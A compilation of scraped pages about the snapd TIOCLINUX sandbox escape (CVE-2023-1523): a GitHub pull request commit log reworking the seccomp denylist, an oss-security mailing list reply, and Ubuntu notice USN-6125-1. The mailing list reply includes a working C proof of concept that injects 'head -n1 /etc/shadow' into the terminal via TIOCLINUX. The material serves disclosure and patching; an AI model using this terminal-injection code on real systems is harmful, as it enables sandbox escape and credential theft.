* snap-confine: Several code improvements

* snap-confine: Fix format

* snap-confine: Test fix and update deprecated SEEK_CUR

* snap-confine: Fix test

* snap-confine: Use inclusive language where possible

* snap-confine: Make woke happy until we can remove cmd/snap-seccomp-blacklist

---------

Signed-off-by: Maciej Borzecki <maciej.borzecki@canonical.com>
Co-authored-by: Michael Vogt <mvo@ubuntu.com>
Co-authored-by: Maciej Borzecki <maciej.borzecki@canonical.com>")[‚Ä¶](https://github.com/canonical/snapd/pull/13443)`
‚Ä¶

`[182b8ae](/canonical/snapd/commit/182b8ae699e39bd3707cec80777f58e5baed34c6)`

```
[‚Ä¶#13443](https://github.com/canonical/snapd/pull/13443))

* snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] [#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)

* snap-confine: tweak sc_seccomp_file_header struct (thanks Philip!)

* snap-confine: tweak struct init workaround in sc_apply_seccomp_profile_for_security_tag (thanks Philip)

* snap-seccomp: remove outdated comment about big endian

* snap-confine: rename sc_must_read_header_from_file->sc_must_read_and_validate_header_from_file

* snap-seccomp: rework exportBPF() to not require a temp file

Thanks to Valentin for the suggestion. Also reverts the change to
the `install-store-laaaarge` tests because there is no need for
space in /tmp anymore.

* tests: improve messae in security-seccomp deny test

* snap-confine: rename "struct stat buf" -> "struct stat stat_buf"

* snap-confine: check that filer size if multiple of sock_filter

Thanks to Valentin for the suggestion. Also adds a bunch of
C unit tests to check that the code works correctly. Sadly
C makes it hard to write this in a concise way so there is
a bit of repetition.

* snap-confine: extract must_read_and_validate_header_from_file_dies_with() helper

* snap-confine: workaround bug in gcc from 14.04

The gcc (4.8.4) in 14.04 will not compile the following code:
```
	struct sc_seccomp_file_header hdr = {0};
```
and will error with:
```
snap-confine/seccomp-support.c: In function ‚Äòsc_apply_seccomp_profile_for_security_tag‚Äô:
snap-confine/seccomp-support.c:246:9: error: missing braces around initializer [-Werror=missing-braces]
  struct sc_seccomp_file_header hdr = {0};
         ^
snap-confine/seccomp-support.c:246:9: error: (near initialization for ‚Äòhdr.header‚Äô) [-Werror=missing-braces]
```

to workaround this a pragma is added.

* snap-confine: check filters are not empty and keep read access to global.bin file

* tests: add details field to security-profiles and snap-seccomp spread tests

* snap-confine: move empty filter validation to sc_must_read_filter_from_file to avoid conflicts with classic snaps

* snap-{seccomp,confine}: add tests for missing seccomp profile and explicit deny has precedence to to explicit allow

* snap-confine: run make fmt

* cmd/snap-confine: make fmt again with indent 2.2.13+

Signed-off-by: Maciej Borzecki <maciej.borzecki@canonical.com>

* snap-confine: Several code improvements

* snap-confine: Fix format

* snap-confine: Test fix and update deprecated SEEK_CUR

* snap-confine: Fix test

* snap-confine: Use inclusive language where possible

* snap-confine: Make woke happy until we can remove cmd/snap-seccomp-blacklist

---------

Signed-off-by: Maciej Borzecki <maciej.borzecki@canonical.com>
Co-authored-by: Michael Vogt <mvo@ubuntu.com>
Co-authored-by: Maciej Borzecki <maciej.borzecki@canonical.com>
```

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fcanonical%2Fsnapd%2Fpull%2F12849)

Reviewers

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&v=4)](/mvo5) [mvo5](/mvo5)

mvo5 approved these changes

[![@valentindavid](https://avatars.githubusercontent.com/u/432830?s=40&v=4)](/valentindavid) [valentindavid](/valentindavid)

valentindavid approved these changes

Assignees

No one assigned

Labels

[cherry-picked](/canonical/snapd/labels/cherry-picked)

Projects

None yet

Milestone

 [**2.59**](/canonical/snapd/milestone/46 "2.59")

Development

Successfully merging this pull request may close these issues.

4 participants

[![@alexmurray](https://avatars.githubusercontent.com/u/56540?s=52&v=4)](/alexmurray) [![@codecov-commenter](https://avatars.githubusercontent.com/u/65553080?s=52&v=4)](/codecov-commenter) [![@mvo5](https://avatars.githubusercontent.com/u/914418?s=52&v=4)](/mvo5) [![@valentindavid](https://avatars.githubusercontent.com/u/432830?s=52&v=4)](/valentindavid)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from marc.info_415ee862_20250111_150339.html ===

```
[[prev in list](?l=oss-security&m=167878388806050&w=2)] [[next in list](?l=oss-security&m=167879081510352&w=2)] [[prev in thread](?l=oss-security&m=167878388806050&w=2)] [[next in thread](?l=oss-security&m=167879081510352&w=2)]
List:       [oss-security](?l=oss-security&r=1&w=2)
Subject:    [Re: [oss-security] TTY pushback vulnerabilities / TIOCSTI](?t=167878390800002&r=1&w=2)
From:       [Jakub Wilk <jwilk () jwilk ! net>](?a=129054139200002&r=1&w=2)
Date:       [2023-03-14 10:36:26](?l=oss-security&r=1&w=2&b=202303)
Message-ID: [20230314103626.3ucbt2rjdfhjbe6t () jwilk ! net](?i=20230314103626.3ucbt2rjdfhjbe6t%20()%20jwilk%20!%20net)
[Download RAW [message](?l=oss-security&m=167879021709955&q=mbox) or [body](?l=oss-security&m=167879021709955&q=raw)]

* Hanno B√É¬∂ck <hanno@hboeck.de>, 2023-03-14 09:51:
>In the 2017 post solar designer mentioned that the Linux kernel
>developers have multiple times rejected changes in the kernel.

I believe this is the post in question:
<https://www.openwall.com/lists/oss-security/2017/06/03/9>

>Starting with Kernel 6.2 it is possible to disable TIOCSTI (unset
>CONFIG_LEGACY_TIOCSTI).

Nice, but...

On Linux virtual terminals, it's possible to achieve pretty much the
same effect using TIOCLINUX, the ioctl used by gpm to implement
copy&pasting.

I've attached a minimal PoC. A more elaborate one is here:
<https://github.com/jwilk/ttyjack>

--
Jakub Wilk

[["minittyjack.c" (text/x-csrc)]](?l=oss-security&m=167879021709955&q=p3)

#include <stdio.h>
#include <sys/ioctl.h>

#include <linux/tiocl.h>
#include <linux/vt.h>

int main(void)
{
    printf("\33[H\33[2J");
    printf("head -n1 /etc/shadow\n");
    fflush(stdout);
    struct {
        char padding;
        char subcode;
        struct tiocl_selection sel;
    } data = {
        .subcode = TIOCL_SETSEL,
        .sel = {
            .xs = 1, .ys = 1,
            .xe = 1, .ye = 1,
            .sel_mode = TIOCL_SELLINE
        }
    };
    ioctl(0, TIOCLINUX, &data.subcode);
    data.subcode = TIOCL_PASTESEL;
    ioctl(0, TIOCLINUX, &data.subcode);
}

[[prev in list](?l=oss-security&m=167878388806050&w=2)] [[next in list](?l=oss-security&m=167879081510352&w=2)] [[prev in thread](?l=oss-security&m=167878388806050&w=2)] [[next in thread](?l=oss-security&m=167879081510352&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add¬†a¬†list |
Sponsored¬†by¬†[KoreLogic](http://www.korelogic.com/)



=== Content from ubuntu.com_ba1d1fd9_20250111_150339.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-6125-1: snapd vulnerability

31 May 2023

An intended access restriction in snapd could be bypassed by strict mode snaps.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 23.04](/security/notices?release=lunar)
* [Ubuntu 22.10](/security/notices?release=kinetic)
* [Ubuntu 22.04 LTS](/security/notices?release=jammy)
* [Ubuntu 20.04 LTS](/security/notices?release=focal)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [snapd](/security/cves?package=snapd) - Daemon and tooling that enable snap packages

## Details

It was discovered that the snap sandbox did not restrict the use of the

ioctl system call with a TIOCLINUX request. This could be exploited by a

malicious snap to inject commands into the controlling terminal which would

then be executed outside of the snap sandbox once the snap had exited. This

could allow an attacker to execute arbitrary commands outside of the

confined snap sandbox. Note: graphical terminal emulators like xterm,

gnome-terminal and others are not affected - this can only be exploited

when snaps are run on a virtual console.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 23.04

* [snapd](https://launchpad.net/ubuntu/%2Bsource/snapd)
  -
  [2.59.1+23.04ubuntu1.1](https://launchpad.net/ubuntu/%2Bsource/snapd/2.59.1%2B23.04ubuntu1.1)

##### Ubuntu 22.10

* [snapd](https://launchpad.net/ubuntu/%2Bsource/snapd)
  -
  [2.58+22.10.1](https://launchpad.net/ubuntu/%2Bsource/snapd/2.58%2B22.10.1)

##### Ubuntu 22.04

* [snapd](https://launchpad.net/ubuntu/%2Bsource/snapd)
  -
  [2.58+22.04.1](https://launchpad.net/ubuntu/%2Bsource/snapd/2.58%2B22.04.1)

##### Ubuntu 20.04

* [snapd](https://launchpad.net/ubuntu/%2Bsource/snapd)
  -
  [2.58+20.04.1](https://launchpad.net/ubuntu/%2Bsource/snapd/2.58%2B20.04.1)

##### Ubuntu 18.04

* [snapd](https://launchpad.net/ubuntu/%2Bsource/snapd)
  -
  [2.58+18.04.1](https://launchpad.net/ubuntu/%2Bsource/snapd/2.58%2B18.04.1)

##### Ubuntu 16.04

* [snapd](https://launchpad.net/ubuntu/%2Bsource/snapd)
  -
  2.54.3+16.04.0ubuntu0.1~esm6
  Available with [Ubuntu Pro](/pro)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2023-1523](/security/CVE-2023-1523)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

¬© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page


